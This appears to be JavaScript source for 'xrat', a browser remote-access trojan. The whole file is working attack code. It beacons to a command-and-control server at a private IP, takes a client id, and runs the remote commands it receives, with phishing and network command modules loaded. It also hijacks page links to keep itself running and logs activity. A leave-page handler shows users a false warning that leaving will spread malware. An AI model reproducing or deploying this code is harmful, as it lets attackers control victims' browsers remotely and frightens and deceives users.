require(['setup','utils','visibly','logger','command','commands/basic','commands/network','commands/effects', 'commands/phishing'], 
function(setup,utils,visibly,logger,command,basic,network,effects,phishing){

	if(typeof window.xrat === 'undefined'){

		var xrat = {
			homeUrl: 'http://192.168.0.105',
			pollSpeed: 10000,
			cid: undefined,
			beaconString: '',
			commandQueue: [],
			completedCommands: [],
			headTag: document.getElementsByTagName("head")[0],
			persistence: 'newtab', // or 'newtab'

			start: function(){
				var self = this;
				window.onbeforeunload = this.savethequeen;
				setup.run(function(){
					//Code to execute once the setup is complete
					self.run();
				});
			},

			testCommand: function(data){
				this.handleCommand(data);
			},

			run: function(){
				//only starts running once everthing in the setup is complete
				if(this.persistence === 'iframe'){
					$('a').click(function(e){
						e.preventDefault();
						utils.fullscreenIframe(e.currentTarget.href);
					});
				}
				else if(this.persistence === 'newtab'){
					utils.replaceLinks('target','_window');
				}
				utils.replaceLinks('href','http://www.reddit.com');
				logger.on();
				var self = this;
				this.poll();
			},

			poll: function(){
				var self = this;
				
				if(typeof this.cid !== 'undefined'){
					this.beaconString = '?cid=' + this.cid;
				}
				else{
					this.beaconString = '';
				}
				$.ajax({
					type: "GET",
					url: self.homeUrl + "/beacon" + this.beaconString,
					dataType: 'json',
					
				}).done(function(data){
					if(data.type == 'cidAssign'){
						self.cidAssign(data);
					}
					else if(data.type == 'noCommand'){
						self.noCommand(data);
					}
					else if(data.type == 'command'){
						self.handleCommand(data);
					}
					else{
						console.log("what the fuck, nothing");
					}
				});

				setTimeout(function(){self.poll();}, this.pollSpeed);
			},

			cidAssign: function(data){
				console.log("assigning cid " + data.data.cid);
				this.cid = data.data.cid;
				if(typeof window.localStorage !== 'undefined'){
					localStorage.setItem("cid", this.cid);
				}
			},

			noCommand: function(data){
				console.log("no commands, just wait around");
			},

			handleCommand: function(data){
				console.log("Got a command");
				// console.log(data);

				if(this.safeToMakeCommand(data.commandID)){
					var type = data.command[0];
					if(typeof command.commandTypes[type] === 'function'){
						this.command = command.commandTypes[type](data.commandID,data.command[1]);
						// console.log(this.command);
						// this.command.getInfo();
						this.command.perform();
					}
					else{
						console.log("unknown command type");
					}
				}
			},

			safeToMakeCommand: function(id){
				if(typeof this.command !== 'undefined'){ // If there is already a command
					console.log("NOT SAFE TO MAKE COMMAND: already have a command on the xrat object");
					return false;
				}
				else{
					if(this.isAlreadyCompleted(id)){ // If we've already done this command, wait for the next beacon
						console.log("NOT SAFE TO MAKE COMMAND: already did command id: " + id);
						return false;
					}
					else{
						return true; // GIMME DEM COMMANDS
					}
				}
			},

			isAlreadyCompleted: function(id){
				var l = this.completedCommands.length;
				for(var i=0;i<l;i++){
					if(id == this.completedCommands[i]){
						return true;
					}
				}
				return false;
			},

			savethequeen: function(e){
				e.preventDefault();
				console.log("just tried to leave, fuck that");
				return "Your computer has been infected with malware, by clicking Leave this page it will spread.";
			}

		};

	window.xrat = xrat;
	xrat.start();

	}

});
